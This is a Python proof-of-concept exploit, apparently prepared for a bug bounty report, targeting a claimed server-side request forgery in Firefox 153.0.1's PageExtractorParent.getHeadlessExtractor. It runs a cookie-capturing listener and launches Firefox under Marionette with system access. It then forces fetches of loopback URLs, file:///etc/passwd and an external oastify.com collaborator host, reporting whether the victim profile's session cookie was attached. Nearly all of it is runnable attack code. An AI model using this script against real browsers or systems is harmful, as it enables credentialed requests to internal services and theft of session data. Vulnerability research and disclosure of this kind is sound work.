#!/usr/bin/env python3
"""
Firefox 153.0.1 — PageExtractorParent.getHeadlessExtractor authenticated SSRF PoC.

Run:  python3 poc.py
Edit the two placeholders below first.

What it does:
  1. starts an HTTP listener on 0.0.0.0:8999 that prints every request (cookies highlighted)
  2. launches Firefox 153.0.1 on about:welcome with Marionette enabled
  3. primes a cookie for the listener origin (so the profile jar holds one)
  4. drives getHeadlessExtractor over the scheme/target matrix
  5. prints CONFIRMED / FAILED with the captured requests

Chrome-scope access is used only as a *verification oracle* to reach the parent-process
module directly; it is not part of the claimed attack path. The attack-path half
(page-scope pref writes) is in index.html / full_chain_*.js.
"""
import http.server, socketserver, json, os, shutil, socket, subprocess
import sys, tempfile, threading, time

FF_BIN     = "/home/sn0x/bb/targets/ff-nightly-hunt/firefox/firefox"
COLLAB_URL = "yce429nvg1uqzxbmkseqldy6vx1qphd6.oastify.com"

PORT, MPORT = 8999, 2828
RED, GRN, YEL, DIM, RST = "\033[91m", "\033[92m", "\033[93m", "\033[2m", "\033[0m"
HITS = []

# ---------------------------------------------------------------- listener
class H(http.server.BaseHTTPRequestHandler):
    def _dump(self):
        rec = {"path": self.path, "cookie": self.headers.get("Cookie"),
               "ua": self.headers.get("User-Agent"),
               "sfs": self.headers.get("Sec-Fetch-Site")}
        HITS.append(rec)
        print(f"\n{GRN}{'='*74}{RST}")
        print(f"{GRN}{self.command} {self.path} {self.request_version}{RST}")
        for k, v in self.headers.items():
            if k.lower() == "cookie":
                print(f"  {RED}{k}: {v}{RST}   <-- CREDENTIALS ATTACHED")
            else:
                print(f"  {DIM}{k}: {v}{RST}")
        print(f"{GRN}{'='*74}{RST}")
    def do_GET(self):
        self._dump()
        if self.path.startswith("/victim-visit"):
            body = b"<html><title>victim</title>ok</html>"
            self.send_response(200)
            self.send_header("Set-Cookie", "sessionid=VICTIM_SESSION_abc123; Path=/")
        else:
            body = b"<html><body>SECRET_ACCOUNT_BALANCE_99999</body></html>"
            self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers(); self.wfile.write(body)
    do_HEAD = do_GET
    def log_message(self, *a): pass

def start_listener():
    socketserver.TCPServer.allow_reuse_address = True
    srv = socketserver.TCPServer(("0.0.0.0", PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv

# ---------------------------------------------------------------- marionette
class Marionette:
    def __init__(self, host="127.0.0.1", port=MPORT, timeout=90):
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(timeout); self.buf = b""; self.msgid = 0
        self._read()
    def _read(self):
        while b":" not in self.buf:
            c = self.sock.recv(65536)
            if not c: raise IOError("closed")
            self.buf += c
        ln, _, rest = self.buf.partition(b":")
        n = int(ln)
        while len(rest) < n:
            c = self.sock.recv(65536)
            if not c: raise IOError("closed")
            rest += c
        self.buf = rest[n:]
        return json.loads(rest[:n])
    def cmd(self, name, params=None):
        self.msgid += 1
        raw = json.dumps([0, self.msgid, name, params or {}]).encode()
        self.sock.sendall(str(len(raw)).encode() + b":" + raw)
        while True:
            m = self._read()
            if m[0] == 1 and m[1] == self.msgid:
                if m[2]: raise RuntimeError(f"{name} -> {m[2]}")
                return m[3]

# ---------------------------------------------------------------- firefox
def launch(profile):
    os.makedirs(profile, exist_ok=True)
    with open(os.path.join(profile, "user.js"), "w") as f:
        f.write('user_pref("marionette.enabled", true);\n')
        f.write('user_pref("remote.active-protocols", 2);\n')
        f.write('user_pref("browser.shell.checkDefaultBrowser", false);\n')
        f.write('user_pref("datareporting.policy.dataSubmissionEnabled", false);\n')
    p = subprocess.Popen(
        [FF_BIN, "--marionette", "--no-remote", "-remote-allow-system-access",
         "--profile", profile, "about:welcome"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    for _ in range(60):
        time.sleep(1)
        try:
            socket.create_connection(("127.0.0.1", MPORT), timeout=2).close()
            return p
        except OSError:
            continue
    raise SystemExit("marionette never came up")

MATRIX_JS = r"""
const {PageExtractorParent} = ChromeUtils.importESModule(
  "resource://gre/actors/PageExtractorParent.sys.mjs");
const [urlString, anon] = arguments;
const done = arguments[arguments.length - 1];
// The callback runs once the hidden browser has loaded the URL.
// Returning the document URI is enough to prove the parent performed the fetch.
// Runs once the hidden browser has loaded the URL. The proof of the fetch is
// the request captured by the listener; this just signals the load completed.
const extract = async () => "load-callback-fired";
(async () => {
  try {
    const r = await PageExtractorParent.getHeadlessExtractor(
      Object.assign({urlString, callback: extract},
                    anon ? {anonymousFetch: true} : {}));
    done("ALLOWED:" + String(r).slice(0, 120));
  } catch (e) { done("REFUSED:" + e.message); }
})();
"""

def main():
    if FF_BIN.startswith("/path/to"):
        sys.exit("edit FF_BIN at the top of this file first")
    collab = COLLAB_URL if not COLLAB_URL.startswith("YOUR_") else None
    if not collab:
        print(f"{YEL}note: COLLAB_URL not set — external rows will be skipped{RST}")

    start_listener()
    print(f"listener up on 0.0.0.0:{PORT}")
    prof = tempfile.mkdtemp(prefix="ffpoc-")
    print(f"profile: {prof}")
    proc = launch(prof)
    try:
        m = Marionette()
        m.cmd("WebDriver:NewSession", {"capabilities": {}})
        m.cmd("WebDriver:SetTimeouts", {"script": 60000})
        m.cmd("Marionette:SetContext", {"value": "chrome"})

        # prime the cookie jar for the listener origin
        print("\n--- priming cookie jar ---")
        try:
            m.cmd("WebDriver:ExecuteAsyncScript", {
                "script": "const d=arguments[arguments.length-1];"
                          "fetch(arguments[0],{credentials:'include'})"
                          ".then(()=>d('ok'),e=>d('err:'+e.message));",
                "args": [f"http://127.0.0.1:{PORT}/victim-visit"]})
        except Exception as e:
            print("  prime failed:", e)
        time.sleep(1)

        rows = [
            ("A loopback, default path",        f"http://127.0.0.1:{PORT}/SSRF-AUTHED-nonanon", False),
            ("D loopback + anonymousFetch",     f"http://127.0.0.1:{PORT}/SSRF-AUTHED-anon",    True),
            ("E file: scheme (control)",        "file:///etc/passwd",                            False),
        ]
        if collab:
            rows += [
                ("B external http, default",    f"http://{collab}/SSRF-external-http",           False),
                ("C external http + anon (control)", f"http://{collab}/SSRF-anon-refused",       True),
                ("F external https, default",   f"https://{collab}/FIREFOX-PARENT-SSRF-unrestricted", False),
            ]

        print("\n--- scheme / target matrix ---")
        results = []
        for label, url, anon in rows:
            try:
                r = m.cmd("WebDriver:ExecuteAsyncScript",
                          {"script": MATRIX_JS, "args": [url, anon]})["value"]
            except Exception as e:
                r = "MARIONETTE-ERR:" + str(e)[:200]
            results.append((label, r))
            print(f"  {label:<38} {r[:70]}")
            time.sleep(0.6)

        time.sleep(2)
        print("\n" + "=" * 74)
        authed = [h for h in HITS if h["path"].startswith("/SSRF-AUTHED-nonanon") and h["cookie"]]
        anon_h = [h for h in HITS if h["path"].startswith("/SSRF-AUTHED-anon")]
        if authed:
            print(f"{GRN}CONFIRMED{RST} — parent fetched an internal URL WITH the profile cookie:")
            for h in authed:
                print(f"    {h['path']}   {RED}Cookie: {h['cookie']}{RST}")
            if anon_h:
                print(f"  control: anonymousFetch path cookie = {anon_h[0]['cookie']} (expected None)")
        else:
            print(f"{RED}FAILED{RST} — no authenticated internal request captured.")
            print(f"  requests seen: {[h['path'] for h in HITS]}")
        if collab:
            print(f"\n  check your Collaborator for /SSRF-external-http and"
                  f" /FIREFOX-PARENT-SSRF-unrestricted")
        print("=" * 74)
    finally:
        try:
            os.killpg(os.getpgid(proc.pid), 15)     # whole process group, not just the wrapper
        except Exception:
            try: proc.terminate()
            except Exception: pass
        for _ in range(20):
            if proc.poll() is not None: break
            time.sleep(1)
        shutil.rmtree(prof, ignore_errors=True)

if __name__ == "__main__":
    main()
